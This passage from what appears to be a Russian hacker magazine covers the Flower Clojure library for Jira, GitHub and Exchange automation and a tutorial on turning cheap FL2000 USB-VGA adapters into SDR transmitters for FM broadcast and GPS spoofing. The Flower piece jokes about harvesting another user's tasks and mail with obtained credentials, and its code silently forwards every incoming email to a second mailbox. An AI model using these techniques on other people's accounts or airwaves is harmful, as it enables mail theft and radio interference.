тролем целостности данных стоит только на SSD.
  Пройдет несколь ко  лет, пока LUKS2 окрепнет и сможет пол ностью
заменить своего предшественника. Это было с файловыми системами ext
и должно произойти с LUKS2. Что до LUKS1, то он по‐прежнему хорош и пока
что никуда не уходит. Прекращать его поддержку не намечается, поэтому нет
поводов для беспокойства.


        WWW

                           •dm‐integrity
                    •Презентация LUKS2 на FOSDEM 2018
                            •Practical Cryptographic Data Integrity Protection
                             with Full Disk Encryption Extended Version
                    •Спецификация LUKS2 on‐disk format
                          •Optimizing authenticated encryption algorithms.
                           Master’s Thesis
                       •Argon2
ТРЮКИ
ПОЛЕЗНАЯ
 ФУНКЦИОНАЛЬЩИНА





     ГРАБИМ ПОЧТУ, ТРЕКЕРЫ ЗАДАЧ
     И РЕПОЗИТОРИИ С CLOJURE





Язык программирова ния  Clojure  исполь‐
зуется  такими  open  source  про екта ми,
как NASA CMR, Cisco Threat Grid, CircleCI,
Jepsen, стартапами и некото рыми круп‐
ными компаниями. В Positive Technologies          Сергей Собко                                                                                         Руководитель группы
мы решили попробовать применить Clojure           пользовательскогоразработки
как платформу для базовой авто матизации        Firewall,интерфейсаPositivePT TechnologiesApplication
процессов управления разработкой прог‐
раммного обеспечения, но что‐то пошло
не так: проект по автоматизации стал боль‐
шим и опенсорсным.


        WWW

                        TL;DR:
                          https://github.com/PositiveTechnologies/ﬂower



ЗАЧЕМ ОНО ТИМЛИДУ
Я — один из тимлидов в команде разработки PT Application Firewall, защит‐
ного экрана уровня приложений. В один прекрасный момент раз мер команды
превысил критический порог, когда мож но делать руками всю свою рутинную
работу, и я начал писать автоматизированную систему, которая умела бы вза‐
имодействовать с почтой, трекера ми задач и сис темами контроля версий. Я
назвал ее «автоматический тимлид».
   Распределение задач — одна из рутин ных процедур, которую легко авто‐
матизировать, если в команде существует матрица компетенций: назначить
исполнителя в зависимос ти от заголовка задачи или ее компонента можно,
если уметь программно читать задачу с таск‐трекера и обновлять некоторые
поля в ней. Аналогич ная история с автомати чес ким назначением по набору
критериев ответственного проверяющего в пулл‐реквест в системе контроля
версий для рецензирова ния исходного кода.





В итоге, конечно, автоматический тим лид был раз делен на бизнес‐логику
и общую библиотеку интеграций (я наз вал ее Flower). О последней давай
и поговорим.


ЗАЧЕМ ОНО ВООБЩЕ ВСЕМ
Зачем мне понадобилось такое программное обес печение, в целом понятно,
но зачем же оно может понадобить ся тебе?
  Допустим, по счастливому стечению обстоятель ств, у тебя есть учетные
данные неко его поль зователя Jira. Очень хочется на память сохранить пару
тысяч задач этого пользователя (а заодно и всю его почту), чтобы развлекать‐
ся серыми осен ними вечерами, почитывая занимательные комментарии.
Почему бы не сделать это, написав всего три строчки кода?
  Или ты менеджер проекта по раз работке программных продуктов и решил
устроить своим программистам полный KPI, замеряя производительность
людей в условных пулл‐реквестах на задачу. Собирать статис тику с двух
и более разных систем одновременно тоже можно без техничес ких проблем.
   Как вариант, ты желаешь перенести все задачи из GitLab и Jira на GitHub
(потому что твой проект резко стал опенсорсным), а заодно настроить авто‐
матическую пересылку сообщений из почты в Slack. И даже это делается
не очень сложно!


ПОЧЕМУ CLOJURE
Первый воп рос, который можно было бы мне задать, зву чит примерно так:
почему ты не выбрал Python, ведь ты с ним зна ком десяток лет и он имеет все
необходимые библиотеки интеграций? Не имеет. Имеет, конечно, но не все
работает так гладко, как SDK на Java, соз данный раз работчиками систем,
с которыми мы интегрируемся. А в некоторых слу чаях еще и не хватает мно‐
гопоточности. Тут нужно заметить, что для первоначального прототипа я,
конечно же, и выбрал Python, а точнее HyLang (Lisp на его стеке), но в итоге
решил внимательнее присмотреться к JVM.
  И второй очевидный воп рос — почему вообще Lisp? Потому что, насколь‐
ко мне известно, лучший способ соз дать свой DSL, не изобретая новый син‐
таксис, — взять Lisp, проверенный временем язык с префиксной нотацией
и веселыми скобоч ками (на самом деле это называется S‐выражения), и,
используя макросы, обо гатить его до домена исполь зования.
  Совокупность этих двух факторов и побудила меня выбрать  Clojure
как язык программирования и платформу для интеграций с различны ми сис‐
темами.





        Пример приложения, использующего биб лиотеку Flower


SHOW ME THE CODE
Чтобы начать писать на Clojure свой скрипт или даже целую систему, исполь‐
зующую Flower, необ ходимо для начала установить Leiningen (для Windows
в некоторых случаях это может ока заться немного нетривиальной задачей,
поэтому рекомен дую взять любую *nix‐систему). Если ты вдруг не знаешь Clo‐
jure, то рекомендую кни гу Clojure for the Brave and True — идеальное пособие
для освоения языка за пару вечеров.
   Чтобы начать новый проект на базе Flower, можно вос пользоваться шаб‐
лоном, набрав в терминале


lein new flower my‐new‐flower‐app

При этом в файл project.clj в созданной директории проекта будет добав‐
лена зависимость [flower "0.4.3"] — это метапакет, содержащий почти
все необходимое. Для тестового приложения он нам впол не подойдет.
  Давай теперь напишем наше приложение. В качестве подопытной сис‐
темы контроля версий и трекера задач воспользуемся GitHub.
  Для  аутентификации нам понадобится добавить  токен пользователя
GitHub, чтобы иметь возможность делать изменения и не быть ограничен‐
ными рейтом запросов. Добавь сгенерированный для своей учетной записи
токен вместо звездочек в файл .credentials.edn в домашней директории
пользователя (~/.credentials.edn) в следующем формате:


1  {:token {:github "****************************************"}}

Теперь можно начать ставить эксперименты. Для этого в директории проекта
запустим REPL из командной стро ки:


lein repl


Тре керы задач
Подключим необходимые модули и определим наш трекер задач:


1  (require '[flower.macros]
2           '[flower.tracker.core])
3  (def tracker‐url "https://github.com/PositiveTechnologies/flower")
4  ;; Можно без этого макроса, если трекер задач
5  ;; приемлет запросы без авторизации
6  (flower.macros/with‐default‐credentials
7    (def pt‐github‐tracker (flower.tracker.core/get‐tracker tracker‐url)))

Давай посмотрим, что теперь содержится в определении pt‐github‐track‐
er. Для наглядности я сделал pretty‐вывод и убрал не очень важные сейчас
поля.


1  my‐new‐flower‐app.core=> pt‐github‐tracker
2  #flower.tracker.github.tracker.GithubTracker{
3    :tracker‐component #flower.tracker.core.TrackerComponent{
4                         :auth {:github‐token "********"}
5                         :context {}}
6    :tracker‐name :github‐github.com‐flower
7    :tracker‐url "https://github.com/PositiveTechnologies"
8    :tracker‐project "flower"}

Функция get‐tracker подставила авто риза ционные данные и развернула
строковый адрес трекера задач в запись с общим протоколом flower.
tracker.proto.TrackerProto. Если тип трекера не определился верно, то
тип  записи  будет  flower.tracker.default.tracker.DefaultTracker.
Это поведение можно изменить, экс плицитно указав тип трекера с помощью
макроса flower.tracker.core/with‐tracker‐type.
  Получить все задачи из трекера можно следующей командой:


1  (def tasks (.get‐tasks pt‐github‐tracker))

Самостоятельно можешь взглянуть, из каких полей состоит, например, пер‐
вая задача в трекере пос ле выборки, с помощью команды (first tasks),
а затем давай сделаем полную выборку в формате JSON. Зависимость clo‐
jure.data.json приехала к нам вместе с метапакетом flower, поэтому весь
оставшийся код будет выглядеть так:


1  (require '[clojure.data.json])
2  ;; Функция сериализации, которую мы используем для удаления
3  ;; полей :tracker и разыменования дополнительных невыполненных
4  ;; полей (например, комментарии)
5  (defn serialize‐task [task]
6    (reduce‐kv (fn [self k v]
7                 (if (= k :tracker)
8                   self
9                   (assoc self
10                         k (if (delay? v) @v v))))
11              {}
12              task))
13 ;; Печатаем результирующий JSON
14 (clojure.data.json/pprint {:tasks (map serialize‐task
15                                        tasks)})

Из  интересных  вещей,  которые  содержит  в  себе библиотека  Flower
при работе с трекерами задач, мож но выделить еще изменение полей
задачи. Делается это двумя строчками кода (и требует прав на запись):


1  ;; Получаем первую задачу из выборки
2  (def first‐task (first tasks))
3  ;; Обновляем поля заголовка и тегов
4  (.upsert! (assoc first‐task
5                   :task‐title "New title"
6                   :task‐tags ["sometag"]))

На этом месте, конечно, вывалится ошиб ка о невозможности что‐либо
записать в репозиторий, если не хва тает на это прав: RequestException
Must have admin rights to Repository. (403). Но если вдруг хватает, то
для первой задачи из выборки будут фактичес ки обновлены заголовок и теги,
а результатом вернется обновленная запись.


Системы кон тро ля версий
С системами контроля версий абсо лютно ана логичная история:


1  (require '[flower.macros]
2           '[flower.repository.core])
3  (def repo‐url "https://github.com/PositiveTechnologies/flower")
4  (flower.macros/with‐default‐credentials
5    (def pt‐github‐repo (flower.repository.core/get‐repository repo‐url)))

Знакомо, не правда ли? Во время разработки биб лиоте ки я старал ся сделать
так, чтобы опре деле ния для раз ных типов систем были похожи между собой
и чтобы из названий функций было понят но их наз начение.
  Посмотреть, какие функции поддерживаются протоколами различных сис‐
тем, можно здесь (одна ко идея записей в том, что обращаться к их полям
можно и напрямую, минуя вызовы этих функций в протоколах; так что, если
для какого‐то поля не определена функция выборки, его можно выбрать
из записи через функцию get).
  Полистаем теперь пулл‐реквесты из репози тория:


1  (def prs (.get‐pull‐requests pt‐github‐repo))
2  ;; Получаем первый пулл‐реквест из выборки
3  (def first‐pr (first prs))

Для выбранного пулл‐реквеста выведем на печать все комментарии и счет‐
чики (например, количество комментариев LGTM):


1  (println (.get‐comments first‐pr))
2  (println (.get‐counters first‐pr))

Если вдруг у тебя есть пра ва на запись в репозиторий, то можно смерджить
пулл‐реквест. Мерджить будем, только если один из комментариев содержит
слово LGTM:


1  (when (> (get (.get‐counters first‐pr)
2                :count‐lgtms)
3           0)
4    (.merge‐pull‐request! first‐pr))


Системы обме на сооб щениями
Пора программно почитать рабочую почту! Для этого нужно добавить в соз‐
данный раньше ~/.credentials.edn запись  аккаунта Exchange. После
добавления учет ных данных файл может выглядеть, например, так (в примере
поле :login содержит пользователя Exchange, :password — его пароль,
:domain — домен Active Directory и :email — почтовый адрес пользователя):


1  {:token {:github "****************************************"}
2   :account {:login "jdoe"
3             :password "************************"
4             :domain "EXAMPLE"
5             :email "jdoe@example.com"}}

Так как метапакет не вклю чает в себя зависимости конкретных реализаций
мессенджинговых систем, то каждую нужно ука зывать в project.clj экспли‐
цитно. Для Exchange необходимо подключить пакет [flower/flower‐inte‐
gration‐exchange  "0.4.3"]. Итоговый файл проекта пос ле этого будет
выглядеть, например, так:


1  (defproject my‐new‐flower‐app "0.1.0‐SNAPSHOT"
2    :description "FIXME: write description"
3    :url "http://example.com/FIXME"
4    :dependencies [[org.clojure/clojure "1.9.0"]
5                   [flower "0.4.3"]
6                   [flower/flower‐integration‐exchange "0.4.3"]]
7    :main ^:skip‐aot my‐new‐flower.core
8    :target‐path "target/%s"
9    :profiles {:uberjar {:aot :all}})

Перезапустим REPL, закрыв его и повторно из директории проекта выполнив
команду lein  repl. После этого можно приступить к под ключению биб‐
лиотек и определе нию почтового ящика:


1  (require '[flower.macros]
2           '[flower.messaging.core])
3  (flower.macros/with‐default‐credentials
4    (flower.messaging.core/with‐messaging‐type :exchange
5      (def msg‐box (flower.messaging.core/get‐messaging))))

Выберем первое сооб щение из почтового ящика с загрузкой тела сообщения
и отправим его же на другой почтовый ящик (фактически это не пересылка,
а отправка нового сообщения с заменой получателя):


1  (def first‐msg (first (.search‐messages msg‐box
2                                          {:count 1
3                                           :load‐body true})))
4  (.send‐message! (assoc first‐msg
5                         :msg‐recipients ["jstiles@example.com"]))

Но еще  интереснее  нас троить  авто матичес кую пересылку  писем.  Так
как пакет clojure.core.async уста новлен как зависимость метапакета
flower, то можно сразу же использовать его для асин хронной обработки вхо‐
дящих сообщений:


1  (require '[clojure.core.async :as async])
2  ;; Подпишемся на входящие сообщения
3  (def ch (.subscribe msg‐box
4                      {:load‐body true}))
5  ;; Создаем сопрограмму для вывода на печать
6  ;; и автоматической пересылки сообщений
7  (async/go‐loop []
8    (when‐let [msg (async/<! ch)]
9      (println msg)
10     (.send‐message! (assoc msg
11                            :msg‐recipients ["jstiles@example.com"]))
12     (recur)))

Теперь при запущенном приложении с подоб ным кодом все входящие сооб‐
щения будут отправляться на другой почтовый ящик сразу же, как только
будут получены.


ЗАКЛЮЧИТЕЛЬНОЕ СЛОВО
В статье я показал лишь небольшую часть примеров применения библиоте ки
интеграции. С этими знаниями уже мож но писать небольшие сце нарии
ad hoc, а после погружения в Clojure можно писать и готовый программный
продукт.
  В моих планах — добавить в библиотеку поддержку большего числа сер‐
висов. YouTrack, HipChat, Telegram и некото рые другие системы ждут своей
очереди на добавление. Поскольку проект опенсорсный, я предлагаю тебе
присоединиться любым доступным спо собом: даже простой фид бек в виде
Issue на «Гитхабе» будет очень ценным для меня. А заведенный автомати‐
зированно, с использованием самой биб лиотеки — вдвойне!
ТРЮКИ
ВЕЩАЕМ
ПО ПЕРЕХОДНИКУ


                           КАК ПРЕВРАТИТЬ
                           КОПЕЕЧНЫЙ
                         ВИДЕОАДАПТЕР
                          В SDR, ЧТОБЫ
                       Журнал «Хакер»                                xakep@glc.ru          ЗАХВАТЫВАТЬ FM
                       И СПУФИТЬ GPS





Утилита Osmo‐ﬂ2k превращает адап тер с USB на VGA
за 15 долларов  в SDR‐передатчик, который позволяет
вещать в диапазонах FM‐радио и телевидения DTV, под‐
делывать сигнал GPS или симулировать базовую станцию
UMTS. Неплохая штука для дружеских розыг рышей и других
интересных применений. В этой статье мы поговорим о том,
как такое вообще возможно, и разберем необходимые шаги.


             INFO

                   В статье использованы материалы презентации
                        автора утилиты Стива Марк графа, которую он
                      представил на OsmoDevCon 2018, статьи в вики
                   Osmocom и заметки Томаса Си в блоге Hacker‐
                        noon. Адаптировал и перевел Андрей Письмен‐
                       ный.


SDR‐приемники в последнее время заметно упа ли в цене, да и SDR с воз‐
можностями передатчика тоже дешевеют, но все еще могут обойтись в сотни
долларов, как, например, Hack‐RF. Про ект Osmo‐ﬂ2k поз воляет использовать
переходник USB 3.0 на VGA, основанный на чипе Fresco Logic FL2000 в качес‐
тве ЦАП общего назначения и SDR‐передатчика. Стоят такие переходники
примерно по 5 дол ларов за шту ку. Благода ря Osmo‐FL2K можно генери‐
ровать непрерывный поток семплов и избегать интервалов горизонтальной
и вертикальной синхрониза ции.
  Несмотря на то что выходной сигнал слаб, его более чем дос таточно
для того, чтобы захватить час тоту FM на расстоянии нескольких метров
или изобразить сигнал спут ника GPS, который обычно проходит сотни тысяч
километров.


           WARNING

                    Использовать передатчик с FL2000 с незафиль‐
                        трован ным  выходом ЦАП  и  присоединенной
                       антенной   за   пределами   экранированного
                    помещения незакон но без лицензии. Вся ответс‐
                        твенность за неосторожное использование опи‐
                       сан ного устройства будет лежать на тебе. Под‐
                      робнее о предосторожностях — в конце статьи.



ПРЕДЫСТОРИЯ
За идеей использовать адаптер VGA в качес тве передатчика — длинная исто‐
рия.
 • В 2001 году Эрик Тьель выпустил программу Tempest for Eliza, которая
   передает сигнал в диапазоне AM.
 • В 2005 году Фабрис Беллар использовал видеокарту ATI Radeon 9200SE,
   чтобы передавать видеосигналы DVB‐T, PAL и NTSC.
 • Позже, в 2009 году, Бартек Каниа опуб ликовал VGASIG — программу,
   которая позволя ет передавать FM‐радио в режиме реального времени
   при помощи SDL и обычной видеокарты.
 • В 2013 году siro использовал все три выхода ЦАП карты VGA и при соеди‐
   ненного модулятора вво да‐вывода, чтобы передавать любые сигналы.

Главный недостаток при использовании обычной видеокарты в том, что сиг‐
нал, который генерирует RAMDAC, не до конца подконтролен пользователю.
Вызывается это тем, что VGA использует горизонтальное и вертикальное
запирание, которое прерывает сигнал. В отличие от конкурентов, произво‐
дящих устройства DisplayLink, которые скорее напоминают обычные виде‐
окарты с интерфейсом USB 2.0/3.0, во Fresco Logic избрали другой подход и,
кстати, запатентовали его.
  Вместо того чтобы встраивать фреймбуфер для ЦАП VGA в само устрой‐
ство, они использовали память компь ютера и непрерывно посылают данные
по USB. Это делает адаптеры особенно дешевыми, поскольку они состоят
из единственного чипа без памяти под фреймбу фер. Главный недостаток,
конечно, в том, что на это тра тятся ресурсы процессора и шина USB оказыва‐
ется забитой. Это приводит к пропуску кадров и миганию экрана.
   Разреверсив USB‐про токол FL2000 в 2016 году, Стив Маркграф экспе‐
риментальным путем обна ружил, что воз можно использовать FL2000 таким
образом, чтобы горизонтальная и вертикальная синхронизация отключалась.
Это дает возможность слать непрерывный поток семплов. Эта работа и стала
основой для Osmo‐ﬂ2k, которая поз воляет передавать слабосильные сиг‐
налы FM, DAB, DVB‐T, GSM, UMTS и GPS.





ПОДДЕРЖИВАЕМОЕ ЖЕЛЕЗО
Для наших экспе римен тов, как ты понимаешь, подходит далеко не любой кон‐
вертер. Пройдем ся по вариантам.


Дон глы USB 3.0 на VGA
Поддерживаются толь ко устройства с чипом Fresco Logic FL2000. Обычно они
маркируются как адаптеры USB 3.0 на VGA с поддержкой разрешения 1920 ×
1080 по USB 3.0 и 800 × 600 по USB 2.0. Иног да бывает написано, что мак‐
симальное разрешение — 1920 × 1200, но этот режим работает только
с некоторыми контрол лерами xHCI при включенной компрессии RLE.
   Если на коробке написа но, что максимальное раз решение 2048 × 1152,
и заявлена поддержка macOS либо только интерфейс USB 2.0, то внутри
будет чип DisplayLink, который несовместим с Osmo‐ﬂ2k.
  Цены на адаптеры с FL2000 варь иру ются в пределах 5–15 дол ларов,
а девайсы с DisplayLink сто ят 25 дол ларов и более. Также заметь, что
в устройствах с коннекто ром USB‐C другой чипсет (например, Realtek RT‐
D2166) и это всего лишь конвертеры с DisplayPort на VGA.
  Найти нужный адаптер можно на AliExpress, eBay или Amazon. Устрой ства
бывают разных размеров, иног да заодно поддерживают DVI или HDMI.
Ниже — два наиболее типичных вида устройств.





Дон глы USB 3.0 на HDMI
Если тебе удалось раздобыть только адаптер VGA с USB 3.0 и HDMI, а внутри
у него FL2000‐1Q0‐DX (тот же чип в более крупном корпусе с 88 ножками
и параллельным выводом RGB) и ты не пос тесняешься припаять контакты
к блокам QFN с планарными вывода ми, то тебе при годится распиновка ЦАП
VGA, приведенная ниже.





Во всех адаптерах с USB 3.0 на HDMI, основанных на FL2000, стоит регулятор
напряжения на 1,2 В, и он, похоже, используется не только чтобы задавать
опорное напряжение для ЦАП.





СРАВНЕНИЕ ХОСТОВЫХ КОНТРОЛЛЕРОВ USB
Megasamples показывает,  что производительность SDR/ЦАП  в  секунду
зависит от контрол лера xHCI на компьюте ре. Ниже приведены результаты
замеров, можешь ими руководс твоваться.
  Измерить производительность  твоего  контрол лера USB  ты можешь
командой


> fl2k_test ‐s 162e6

В результате получается что‐то такое:


real sample rate: 157023826 current PPM: ‐30717 cumulative PPM:
‐30717

В  этом  примере  система  не  может  выдать  устройству  больше,
чем 157 мегасемплов в секунду (если помножить на три канала ЦАП, то вый‐
дет 471 мегасемпл в секунду). Можешь сно ва запус тить ﬂ2k_test, задав более
низкую частоту, чем та, что была определена как максимальная, и пос‐
мотреть, насколько стабильно все будет работать.
  Ниже — таблица с результатами на раз ных контроллерах.


                                    Достижимая частота
 Кон трол лер USB 3.0
                                    семплирования

  Intel Corporation 8 Series USB xHCI HC (rev 04)     157 MS/s

  Intel Corporation 7 Series/C210 Series Chipset
                                              157 MS/s
  Family USB xHCI Host Controller (rev 04)

  Intel Corporation Wildcat Point‐LP USB xHCI Con‐
                                              157 MS/s
  troller (rev 03)

  Intel Corporation Sunrise Point‐LP USB 3.0 xHCI
                                            155 MS/s
  Controller (rev 21)

 Samsung Galaxy S5 msm‐dwc3 (на Synopsys De‐
                                             148 MS/s
  signWare USB3.0 IP)

  Odroid XU4 (на Synopsys DesignWare USB3.0 IP)   147 MS/s

 ASMedia Technology Inc. ASM1142 USB 3.1 Host
                                             140 MS/s
  Controller

  Fresco Logic FL1100 USB 3.0 Host Controller (rev
                                             140 MS/s
  10)

  Fresco Logic FL1100 USB 3.0 Host Controller (rev
                                            136 MS/s
  01)

  Fresco Logic FL1009 USB 3.0 Host Controller (rev
                                            136 MS/s
  02)

  Etron Technology, Inc. EJ188/EJ198 USB 3.0 Host
                                             129 MS/s
  Controller

  VIA Technologies, Inc. VL805 USB 3.0 Host Con‐
                                             123 MS/s
  troller (rev 01)

  Etron Technology, Inc. EJ168 USB 3.0 Host Con‐
                                                     117 MS/s
  troller (rev 01)

 Renesas Technology Corp. uPD720202 USB 3.0
                                                   115 MS/s
 Host Controller (rev 02)

  Intel USB 2.0 EHCI Controller                     14 MS/s


БОТЛНЕК PCI EXPRESS НА СТАРЫХ СИСТЕМАХ
Если USB 3.0 на твоей машине реализован при помощи какой‐то карты,
в особенности если это ExpressCard на ноутбуке, то узким местом может быть
не USB 3.0, а сама шина PCI‐E. Проверить это можно командой lspci ‐vv.
  Вывод будет примерно следующим.


04:00.0 USB controller: Renesas Technology Corp. uPD720202 USB 3.0
Host Controller (rev 02) (prog‐if 30 [XHCI])
[...]
                LnkCap: Port #0, Speed 5GT/s, Width x1, ASPM L0s L1,
Exit Latency L0s <4us, L1 unlimited
                        ClockPM+ Surprise‐ LLActRep‐ BwNot‐ ASPMOp
tComp‐
                LnkSta: Speed 2.5GT/s, Width x1, TrErr‐ Train‐
SlotClk+ DLActive‐ BWMgmt‐ ABWMgmt‐
                LnkCtl2: Target Link Speed: 5GT/s, EnterCompliance‐
SpeedDis‐

Здесь важно содер жимое регистра LnkSta. В этом случае связь PCI Express
работает на скорости 2,5 гигатранзакции в секунду вместо полных 5 гигат‐
ранзакций в секунду, которые нужны для USB 3.0.


УСТАНОВКА
Чтобы работать с Osmo‐ﬂ2k, первым делом скачива ем исходники. Тут есть
два варианта:
 • на вебе по адресу http://git.osmocom.org/osmo‐ﬂ2k ;
 • репозиторий с доступом только на чтение: git://git.osmocom.org/
  osmofl2k.

Чтобы ском пилировать код, нужно сначала пос тавить заголовки libusb, если
у тебя их еще нет в сис теме. Если у тебя Debian‐образный дистрибутив, то
пиши


$ sudo apt‐get install libusb‐1.0‐0‐dev

Теперь можно компилировать.


git clone git://git.osmocom.org/osmo‐fl2k.git
mkdir osmo‐fl2k/build
cd osmo‐fl2k/build
cmake ../ ‐DINSTALL_UDEV_RULES=ON
make ‐j 3
sudo make install
sudo ldconfig

Прежде чем исполь зовать устройство под поль зовательским аккаунтом, нуж‐
но загрузить правила udev.


sudo udevadm control ‐R
sudo udevadm trigger


КАК ПОЛЬЗОВАТЬСЯ OSMO-FL2K
Ниже приведены типовые команды для наиболее распространенных случаев
использования.


РИЛТАЙМОВОЕ ВЕЩАНИЕ WBFM
Благодаря ﬂ2k_fm можно передавать вывод зву ковой карты в широком диапа‐
зоне FM. Для этого нужно поставить SoX и pv.


$ sudo apt‐get install sox pv

Для начала нужно узнать наз вание монитора аудиовы хода:


$ pacmd list‐sources | grep name | grep monitor

Результат будет примерно такой:


name: <alsa_output.pci‐0000_00_1b.0.analog‐stereo.monitor>

Чтобы передавать выход аудио как моно WBFM на частоте 95 МГц, можешь
ввести такую команду:


pacat ‐r ‐d alsa_output.pci‐0000_00_1b.0.analog‐stereo.monitor | \
pv ‐B 256k | \
sox ‐t raw  ‐r 44100 ‐e signed‐integer ‐L ‐b 16 ‐c 2 ‐ ‐c 1 ‐e
signed‐integer ‐b 16 ‐t raw ‐ \
biquad 4.76963 ‐2.98129 0 1 0.78833 0 sinc ‐15k loudness 5 | \
fl2k_fm ‐ ‐s 130e6 ‐c 35e6 ‐i 44100

SoX будет применять к аудио филь тр нижних частот 15 кГц, конвертировать
стерео в моно и обеспечивать предусиление (с фильтром biquad). Утилита pv
обеспечивает допол нительную буфери зацию — это опциональная вещь.
   Чтобы вещать стерео WBFM при помощи RDS, можешь использовать
такую команду:


pacat ‐r ‐d alsa_output.pci‐0000_00_1b.0.analog‐stereo.monitor | \
pv ‐B 256k | \
sox ‐t raw ‐r 44100 ‐e signed‐integer ‐L ‐b 16 ‐c 2 ‐ ‐c 2 ‐e
signed‐integer ‐b 16 ‐t raw ‐ \
biquad 4.76963 ‐2.98129 0 1 0.78833 0 sinc ‐15k rate ‐h 228000
loudness 5 | \
fl2k_fm ‐ ‐s 130e6 ‐c 30e6 ‐i 228000 ‐‐stereo ‐‐rds

Теперь SoX ресемплирует аудио в 228 кГц — это нуж но для модулятора RDS.
   Утилита ﬂ2k_fm принимает 16‐бит ные «сырые» семплы PCM.


ТРАНСЛЯЦИЯ GSM
Потоковые графы GNU Radio, равно как и немодулированные семплы,
которые нужны для трансляции GSM и UMTS, можно найти в репозитории ﬂ2k‐
examples.





Юри дичес кие аспекты (не засоряй час тоты!)
Если ты уже используешь любой радиопередат чик, в особенности самодель‐
ный или SDR, стоит полагать, что ты зна ком с юридичес кими и этическими
аспектами радиопередач. Не используй передатчик, пока у тебя есть сом‐
нения относительно легальности. В большинс тве случаев тебе потребуется
как минимум радиолю битель ская катего рия.
  Сырой, нефильтрованный вывод ЦАП будет содержать многие гармоники,
кратные немодулированной час тоте. Именно это креативно экс плуатируется
в Osmo‐ﬂ2k, что бы генерировать сигнал гораздо более высокой частоты, чем
можно было бы получить при помощи ЦАП на 165 МГц без пре образования
с повышением частоты. Одна ко это значит еще и что частотный спектр будет
содержать не только нужную гармонику, но и все низшие гармоники, равно
как и немодулиро ванную час тоту.
  Прежде чем что‐либо переда вать при помощи FL2000, рекомендуем про‐
верить получаемый спектр анализа тором и применить фильтрацию, чтобы
подавить все частоты, кроме той, на которой предполагается передавать.
  Либо для тестов можешь соединить передатчик с приемником коаксиаль‐
ным кабелем, сделав соответствующие изменения.
ТРЮКИ

 ПОЧЕМУ ДОМАШНИЕ ЭКРАНЫ
 ВСЕХ СМАРТФОНОВ — ОТСТОЙ





  ИЛИ ЗАЧЕМ Я НАПИСАЛ AIO LAUNCHER





Не знаю, как тебе, а мне всегда казалось
странным, что мощный смартфон, связыва‐
ющий людей друг с другом и всем осталь‐
ным миром, в качестве ключево го элемента
интерфейса использует абсолютно  бес‐          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
полезный неинформатив ный экран со знач‐              zobnin@glc.ru
ками. Да, есть бейджи, да, иконки часов
и  календаря  действительно  показывают
время и дату, но вы серьезно? Первое, что
видит пользователь, — это просто сетка
иконок?


        WWW

                      Если ты просто хотел узнать, какой ответ на при‐
                       веден ный выше воп рос предлагаю я, вот ссылка:
                       AIO Launcher. Приложе ние бесплатное и работает
                       на любом  Android‐смартфоне  с  версией ОС
                         от 4.4.



В ЧЕМ ПРОБЛЕМА
Представь себе, что ты садишься за штурвал самолета (или тренажера).
Перед тобой огромная приборная панель, но все многочисленные информа‐
ционные экраны и тумблеры закрыты крышками, на которых при веде но наз‐
вание и краткое описание спрятанного под ними элемента управления.
В первый день обучения инс труктор объясняет тебе правила: крышки откры‐
ваются легким прикосновением, но, когда открываешь одну из них, остальные
закрываются. Сделано так, чтобы ты всегда знал, где и что находится, и не
потерялся в море экранов, тумблеров и рычагов.
  В первые дни обучения ты благода ришь конструкторов, придумавших
такую дружелюбную к новичкам систему управления. Но со вре менем замеча‐
ешь, что она работает против тебя. Ты уже разоб рался, что к чему, тебе надо
контролировать самолет, знать, что про исходит, и иметь прямой доступ
к любым элементам управления. Поэто му ты просишь инс труктора отключить
функцию автоматического закрытия крышек, а еще лучше убрать их вообще.
  Но инструктор отвечает, что это невозможно, и добавляет, что все сов‐
ременные самоле ты оснащены именно такой приборной панелью, это стан‐
дарт; и вообще, много ты понимаешь в интерфейсе, который придумал гени‐
альный Дронни Ойв!
  Я не приравниваю самолеты к смартфонам, а лишь хочу показать, что
пользователю системы, генерирующей огромное количество информации,
лучше видеть эту информацию на мес те, а не толь ко пос ле прикосновения
пальца. Но все не  так. Вместо информации нам предлагают смотреть
на «крышки» (иконки), под которыми эта информация прячется.
   Да, в Android есть виджеты, и, потратив уйму времени, ты сможешь найти
виджеты, показывающие любую полезную тебе информацию… и получишь
пестрый экран, офор мленный в раз ном стиле, цвете и с различны ми раз‐
мерами шрифтов. Будет ли он удобен? Нет, я пробовал, это мучение.
  А ведь многие из нас уже видели дей стви тельно правильный домашний
экран смартфона. Это экран «Сегодня» в Windows Mobile. Да, я тоже не люб‐
лю эту ОС и считаю крайне неудобной в исполь зовании, но домашний экран
WM был шагом в правильную сторону.





Позже, уже в домашнем экра не Windows Phone, MS попыталась сделать «неч‐
то подобное, но в современном стиле». Одна ко плитки Windows Phone
получились скорее прикольные, чем информа тивные. Они занимали слишком
много пространства и час то вместо детальной информации показывали чис‐
ло или пару слов о каком‐то событии.





Еще был SlideScreen, невероятно крутой лаунчер для Android от Larva Labs.
Его экран почти пол ностью состоял из информации: пос ледние письма,
сообщения в Twitter и Facebook, пропущенные звонки, СМС и даже котировки
акций. Larva Labs сделали это еще во времена Android 2.1, но вскоре выяс‐
нилось, что окупить разработку такого приложения просто невозможно: поль‐
зователи не понимали его и отка зывались ухо дить с привычного иконочного
интерфейса.





Свои попытки были у Yahoo (Aviate), MS (Microsoft Launcher) и независимых
разработчиков (хороший пример: ASAP Launcher). Лично мне ни одна из них
не показалась удачной. Разработчики либо боялись полностью отказываться
от концепции иконок на рабочем столе, либо использовали пространство
экрана крайне нерационально.
  Пришла идея сделать все по‐своему.


ПРОСТОТА, МИНИМАЛИЗМ, ЭФФЕКТИВНОСТЬ
Ключевые идеи AIO Launcher:
   1. К черту икон ки. Сетка иконок — пес трая мозаика без какой‐либо
информационной нагрузки. Как выглядит иконка Skype? Лично я вспоминаю
нечто невнятное яркого синего цвета. А Dropbox? Уже угадываются черты
коробки, которой давно нет, но главное — это темно‐синий, не так ли? Еще у
нас есть Feedly — зеленый, Сбербанк — сно ва зеленый. Pocket — красный,
Yandex Taxi — желтый.
  Мы дифференцируем не иконки, а цвета и наз вания. Иконки — ненужный
отвлекающий шум. По‐хорошему их прос то не должно быть. И по умол чанию
в AIO Launcher их нет. Зато есть сортировка приложений по количес тву запус‐
ков, так что на экране всегда находится только то, что тебе нужно, то, чем ты
пользуешься.
   2. Что еще дол жно быть на экране? На экра не устройства, который
называется «телефон»? Конечно же, спи сок звонков твоей бабушки. А еще
последние СМС.
  Но у нас же не прос то телефон, это смартфон. Поэтому обязательно
покажем погоду, поч ту, новос ти, твиты, сообщения телеграма, календарь и,
конечно же, курс биткой на. Заставим все это прос то работать без всяких
